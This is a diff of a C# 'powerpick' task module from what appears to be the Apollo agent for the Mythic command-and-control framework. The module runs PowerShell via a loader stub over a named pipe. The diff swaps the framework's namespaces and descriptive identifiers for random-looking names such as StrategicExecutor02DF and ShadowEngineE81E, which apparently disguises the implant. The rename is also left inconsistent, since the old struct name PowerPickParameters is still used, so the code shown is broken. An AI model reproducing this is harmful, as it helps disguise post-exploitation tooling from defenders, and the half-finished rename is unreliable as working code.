@@ -9,25 +9,25 @@
 using System;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using ApolloInterop.Serializers;
+using PhantomInterop.Serializers;
 using System.Threading;
 using System.Collections.Concurrent;
 using System.IO.Pipes;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Utils;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Collections;
+using PhantomInterop.Utils;
 
 namespace Tasks
 {
-    public class powerpick : Tasking
+    public class StrategicExecutor02DF : Tasking
     {
         [DataContract]
-        internal struct PowerPickParameters
+        internal struct TacticalServiceE943
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -94,8 +94,8 @@ namespace Tasks
                         _complete,
                         _cancellationToken.Token.WaitHandle
                     }, 1000);
-                    output = string.Join("", _assemblyOutput.Flush());
-                    if (!string.IsNullOrEmpty(output))
+                    output = StringProcessor.CombineElements("", _assemblyOutput.Flush());
+                    if (!ValidationHelper.IsStringEmpty(output))
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(
                             CreateTaskResponse(
@@ -107,8 +107,8 @@ namespace Tasks
                 while (true)
                 {
                     System.Threading.Tasks.Task.Delay(500).Wait(); // wait 1s
-                    output = string.Join("", _assemblyOutput.Flush());
-                    if (!string.IsNullOrEmpty(output))
+                    output = StringProcessor.CombineElements("", _assemblyOutput.Flush());
+                    if (!ValidationHelper.IsStringEmpty(output))
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(
                             CreateTaskResponse(
@@ -141,9 +141,9 @@ namespace Tasks
             try
             {
                 PowerPickParameters parameters = _jsonSerializer.Deserialize<PowerPickParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                    string.IsNullOrEmpty(parameters.PowerShellParams) ||
-                    string.IsNullOrEmpty(parameters.PipeName))
+                if (ValidationHelper.IsStringEmpty(parameters.LoaderStubId) ||
+                    ValidationHelper.IsStringEmpty(parameters.PowerShellParams) ||
+                    ValidationHelper.IsStringEmpty(parameters.PipeName))
                 {
                     throw new ArgumentNullException($"One or more required arguments was not provided.");
                 }
@@ -186,7 +186,7 @@ namespace Tasks
                 );
                 string cmd = "";
                 var loadedScript = _agent.GetFileManager().GetScript();
-                if (!string.IsNullOrEmpty(loadedScript))
+                if (!ValidationHelper.IsStringEmpty(loadedScript))
                 {
                     cmd += loadedScript;
                 }
@@ -238,7 +238,7 @@ namespace Tasks
             }
         }
 
-        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
+        private void IntelligentAdapterAD76(object sender, NamedPipeMessageArgs e)
         {
             _completed = true;
             _complete.Set();
@@ -247,13 +247,13 @@ namespace Tasks
             _cancellationToken.Cancel();
         }
 
-        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
+        private void RobustProvider017A(object sender, NamedPipeMessageArgs e)
         {
             System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
             flushTask = System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
         }
 
-        public void OnAsyncMessageSent(IAsyncResult result)
+        public void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             // Potentially delete this since theoretically the sender Task does everything
@@ -272,7 +272,7 @@ namespace Tasks
             }
         }
 
-        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
+        private void ShadowEngineE81E(object sender, NamedPipeMessageArgs e)
         {
             IPCData d = e.Data;
             string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
